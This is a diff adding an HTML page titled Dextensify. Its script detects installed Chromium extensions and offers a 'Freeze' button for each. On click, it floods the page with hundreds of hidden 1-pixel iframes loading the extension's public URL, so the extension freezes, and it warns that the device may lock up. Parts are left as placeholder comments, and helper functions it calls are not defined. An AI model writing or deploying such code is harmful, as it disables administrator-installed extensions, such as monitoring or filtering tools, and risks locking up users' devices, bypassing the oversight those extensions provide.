@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>Dextensify</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <style>
+        /* Your existing styles here... */
+    </style>
+    <script>
+        /* Your existing script code here... */
+
+        async function create_iframes_smoothly(extension) {
+            const iterations = 5;
+            const public_url = extension.url;
+            const iframes = [];
+
+            for (let i = 0; i < iterations; i++) {
+                let iframe = document.createElement("iframe");
+                document.body.appendChild(iframe);
+                iframes.push(iframe);
+
+                for (let j = 0; j < 50; j++) {
+                    let subframe = document.createElement("iframe");
+                    subframe.src = public_url;
+                    subframe.style.width = subframe.style.height = "1px";
+                    iframe.contentDocument.body.appendChild(subframe);
+                }
+            }
+
+            // Remove iframes after a short delay
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            iframes.forEach(frame => frame.remove());
+        }
+
+        function button_handler(extension) {
+            let cancel = !confirm("After hitting OK, there will be a 5-second delay until the extension starts being frozen. Switch to another tab immediately to prevent the entire device from locking up.");
+
+            if (cancel) return;
+
+            setTimeout(() => {
+                create_iframes_smoothly(extension);
+            }, 5000);
+        }
+
+        // Other optimized button handling functions can be added here...
+
+        async function main() {
+            let detected = await detect_extensions();
+            let buttons_container = from_id("buttons_container")
+
+            if (!window.chrome) {
+                buttons_container.innerHTML = `<p><b>Error: You are not running a Chromium-based browser.</b></p>`;
+                return;
+            } else if (detected.length === 0) {
+                buttons_container.innerHTML = `<p><b>Error: No supported extensions detected.</b></p>`;
+                buttons_container.innerHTML += `<p style="margin-top: -16px;">If you want support for a specific extension added, please make an issue on the <a href="https://github.com/ading2210/dextensify">Github repository</a>, and provide the extension ID and manifest.</p>`;
+                return;
+            } else {
+                buttons_container.innerHTML = ""
+            }
+
+            for (let extension of detected) {
+                let button = document.createElement("button");
+                button.innerText = `Freeze ${extension.name}`;
+                button.onclick = () => {
+                    button_handler(extension);
+                }
+                buttons_container.append(button);
+            }
+        }
+
+        window.onload = main;
+    </script>
+</head>
+
+<body data-new-gr-c-s-check-loaded="8.908.0" data-gr-ext-installed="">
+    <div id="main_div">
+        <!-- Your existing HTML content here... -->
+    </div>
+</body>
+
+</html>
